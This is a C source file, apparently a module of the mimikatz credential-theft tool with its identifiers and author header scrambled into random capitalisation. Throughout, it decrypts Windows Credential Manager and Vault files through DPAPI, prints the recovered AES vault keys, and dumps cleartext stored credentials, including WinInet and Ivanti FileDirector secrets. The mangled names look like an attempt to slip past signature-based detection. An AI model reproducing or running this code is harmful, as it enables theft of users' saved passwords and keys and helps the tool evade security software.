/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kuhl_m_dPApi_crEds.h"

NTSTATUS kuhl_m_dPApi_crEd(int argc, wchar_t * argv[])
{
	PCWSTR infile;
	PBYTE file;
	PVOID out;
	DWORD i, szFile, szOut;
	BOOL isNT5Cred;
	PKULL_M_CRED_BLOB crEd;
	PKULL_M_CRED_LEGACY_CREDS_BLOB legacyCreds;
	
	if(kull_m_string_args_byName(argc, argv, L"in", &infile, NULL))
	{
		if(kull_m_file_readData(infile, &file, &szFile))
		{
			if(szFile >= (DWORD) FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
			{
				isNT5Cred = RtlEqualGuid(file + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER);
				kull_m_dPApi_blob_quick_descr(0, isNT5Cred ? file : ((PKUHL_M_DPAPI_ENCRYPTED_CRED) file)->blob);
				if(kuhl_m_dPApi_unprotect_raw_or_blob(isNT5Cred ? file : ((PKUHL_M_DPAPI_ENCRYPTED_CRED) file)->blob, isNT5Cred ? szFile : ((PKUHL_M_DPAPI_ENCRYPTED_CRED) file)->blobSize, NULL, argc, argv, NULL, 0, &out, &szOut, isNT5Cred ? L"Decrypting Legacy Credential(s):\n" : L"Decrypting Credential:\n"))
				{
					if(isNT5Cred)
					{
						if(legacyCreds = kull_m_crEd_legacy_crEds_create(out))
						{
							kull_m_crEd_legacy_crEds_descr(0, legacyCreds);
							for(i = 0; i < legacyCreds->__count; i++)
								kuhl_m_dPApi_crEd_tryEncrypted(legacyCreds->Credentials[i]->TargetName, legacyCreds->Credentials[i]->CredentialBlob, legacyCreds->Credentials[i]->CredentialBlobSize, argc, argv);
							kull_m_crEd_legacy_crEds_delete(legacyCreds);
						}
					}
					else 
					{
						if(crEd = kull_m_crEd_create(out))
						{
							kull_m_crEd_descr(0, crEd);
							if(kull_m_string_args_byName(argc, argv, L"lsaiso", NULL, NULL))
							{
								kuhl_m_seKuRlSa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) crEd->CredentialBlob, NULL, NULL);
								kprintf(L"\n");
							}
							else kuhl_m_dPApi_crEd_tryEncrypted(crEd->TargetName, crEd->CredentialBlob, crEd->CredentialBlobSize, argc, argv);
							kull_m_crEd_delete(crEd);
						}
					}
					LocalFree(out);
				}
				LocalFree(file);
			}
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	else PRINT_ERROR(L"Input CRED file needed (/in:file)\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dPApi_vAULt(int argc, wchar_t * argv[])
{
	PCWSTR inFilePolicy, inFileCred;
	PVOID filePolicy, fileCred, out;
	DWORD szFilePolicy, szFileCred, szOut, len, i, mode = CRYPT_MODE_CBC;
	BYTE aes128[AES_128_KEY_SIZE], aes256[AES_256_KEY_SIZE];
	PKULL_M_CRED_VAULT_POLICY vAULtPolicy;
	PKULL_M_CRED_VAULT_CREDENTIAL vAULtCredential;
	PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE attribute;
	PKULL_M_CRED_VAULT_CLEAR clear;
	PVOID buffer;
	BOOL isAttr;
	HCRYPTPROV hProv;
	HCRYPTKEY hKey;
	
	if(kull_m_string_args_byName(argc, argv, L"crEd", &inFileCred, NULL))
	{
		if(kull_m_file_readData(inFileCred, (PBYTE *) &fileCred, &szFileCred))
		{
			if(vAULtCredential = kull_m_crEd_vAULt_crEdential_create(fileCred))
			{
				kull_m_crEd_vAULt_crEdential_descr(0, vAULtCredential);

				if(kull_m_string_args_byName(argc, argv, L"policy", &inFilePolicy, NULL))
				{
					if(kull_m_file_readData(inFilePolicy, (PBYTE *) &filePolicy, &szFilePolicy))
					{
						if(vAULtPolicy = kull_m_crEd_vAULt_policy_create(filePolicy))
						{
							kull_m_crEd_vAULt_policy_descr(0, vAULtPolicy);
							if(kuhl_m_dPApi_unprotect_raw_or_blob(vAULtPolicy->key->KeyBlob, vAULtPolicy->key->dwKeyBlob, NULL, argc, argv, NULL, 0, &out, &szOut, L"Decrypting Policy Keys:\n"))
							{
								if(kull_m_crEd_vAULt_policy_key(out, szOut, aes128, aes256))
								{
									kprintf(L"  AES128 key: "); kull_m_string_wprintf_hex(aes128, AES_128_KEY_SIZE, 0); kprintf(L"\n");
									kprintf(L"  AES256 key: "); kull_m_string_wprintf_hex(aes256, AES_256_KEY_SIZE, 0); kprintf(L"\n\n");
									if(CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
									{
										for(i = 0; i < vAULtCredential->__cbElements; i++)
										{
											if(attribute = vAULtCredential->attributes[i])
											{
												kprintf(L"  > Attribute %u : ", attribute->id);
												if(attribute->data && (len = attribute->szData))
												{
													if(buffer = LocalAlloc(LPTR, len))
													{
														RtlCopyMemory(buffer, attribute->data, len);
														if(kuhl_m_dPApi_vAULt_key_type(attribute, hProv, aes128, aes256, &hKey, &isAttr))
														{
															if(CryptDecrypt(hKey, 0, TRUE, 0, (PBYTE) buffer, &len))
															{
																if(isAttr)
																{
																	kull_m_string_wprintf_hex(buffer, len, 0);
																}
																else
																{
																	kprintf(L"\n");
																	if(!attribute->id || (attribute->id == 100))
																	{
																		if(clear = kull_m_crEd_vAULt_clear_create(buffer))
																		{
																			kull_m_crEd_vAULt_clear_descr(1, clear);
																			kull_m_crEd_vAULt_clear_delete(clear);
																		}
																	}
																	else kull_m_string_wprintf_hex(buffer, len, 1 | (16 << 16));
																	kprintf(L"\n");
																}
															}
															else PRINT_ERROR_AUTO(L"CryptDecrypt");
														}
														LocalFree(buffer);
													}
												}
												kprintf(L"\n");
											}
										}
										CryptReleaseContext(hProv, 0);
									}
								}
								LocalFree(out);
							}
							kull_m_crEd_vAULt_policy_delete(vAULtPolicy);
						}
						LocalFree(filePolicy);
					}
					else PRINT_ERROR_AUTO(L"kull_m_file_readData (policy)");
				}
				kull_m_crEd_vAULt_crEdential_delete(vAULtCredential);
			}
			LocalFree(fileCred);
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_readData (crEd)");
	}
	else PRINT_ERROR(L"Input Cred file needed (/crEd:file)\n");

	return STATUS_SUCCESS;
}

void kuhl_m_dPApi_crEd_tryEncrypted(LPCWSTR target, LPCBYTE data, DWORD dataLen, int argc, wchar_t * argv[])
{
	PVOID crEd;
	DWORD crEdLen;
	PKULL_M_CRED_APPSENSE_DN pAppDN;
	if(wcsstr(target, L"Microsoft_WinInet_"))
	{
		if(dataLen >= (DWORD) FIELD_OFFSET(KULL_M_DPAPI_BLOB, dwMasterKeyVersion))
		{
			if(RtlEqualGuid(data + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER))
			{
				if(kuhl_m_dPApi_unprotect_raw_or_blob(data, dataLen, NULL, argc, argv, KULL_M_CRED_ENTROPY_CRED_DER, sizeof(KULL_M_CRED_ENTROPY_CRED_DER), &crEd, &crEdLen, L"Decrypting additional blob\n"))
				{
					kprintf(L"   CredentialBlob: ");
					kull_m_string_printSuspectUnicodeString(crEd, crEdLen);
					kprintf(L"\n");
					LocalFree(crEd);
				}
			}
		}
	}
	else if(wcsstr(target, L"AppSense_DataNow_"))
	{
		kprintf(L"\n* Ivanti FileDirector crEdential blob *\n");
		if(dataLen >= (DWORD) FIELD_OFFSET(KULL_M_CRED_APPSENSE_DN, data))
		{
			pAppDN = (PKULL_M_CRED_APPSENSE_DN) data;
			if(!strcmp("AppN_DN_Win", pAppDN->type))
			{
				if(pAppDN->crEdBlobSize)
				{
					if(kuhl_m_dPApi_unprotect_raw_or_blob(pAppDN->data, pAppDN->crEdBlobSize, NULL, argc, argv, NULL, 0, &crEd, &crEdLen, L"Decrypting additional blob\n"))
					{
						kprintf(L"   CredentialBlob: ");
						kull_m_string_printSuspectUnicodeString(crEd, crEdLen);
						kprintf(L"\n");
						LocalFree(crEd);
					}
				}
				if(pAppDN->unkBlobSize)
				{
					if(kuhl_m_dPApi_unprotect_raw_or_blob(pAppDN->data + pAppDN->crEdBlobSize, pAppDN->unkBlobSize, NULL, argc, argv, NULL, 0, &crEd, &crEdLen, L"Decrypting additional blob\n"))
					{
						kprintf(L"   UnkBlob       : ");
						kull_m_string_printSuspectUnicodeString(crEd, crEdLen);
						kprintf(L"\n");
						LocalFree(crEd);
					}
				}
			}
		}
	}
}

BOOL kuhl_m_dPApi_vAULt_key_type(PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE attribute, HCRYPTPROV hProv, BYTE aes128[AES_128_KEY_SIZE], BYTE aes256[AES_256_KEY_SIZE], HCRYPTKEY *hKey, BOOL *isAttr)
{
	BOOL status = FALSE;
	DWORD mode = CRYPT_MODE_CBC, calgId, keyLen;
	LPCVOID key;

	*isAttr = attribute->id && (attribute->id < 100);
	if(*isAttr)
	{
		calgId = CALG_AES_128;
		key = aes128;
		keyLen = AES_128_KEY_SIZE;
	}
	else
	{
		calgId = CALG_AES_256;
		key = aes256;
		keyLen = AES_256_KEY_SIZE;
	}

	if(status = kull_m_cRyPTO_hkey(hProv, calgId, key, keyLen, 0, hKey, NULL))
	{
		CryptSetKeyParam(*hKey, KP_MODE, (LPCBYTE) &mode, 0);
		if(attribute->szIV && attribute->IV)
			CryptSetKeyParam(*hKey, KP_IV, attribute->IV, 0);
	}
	return status;
}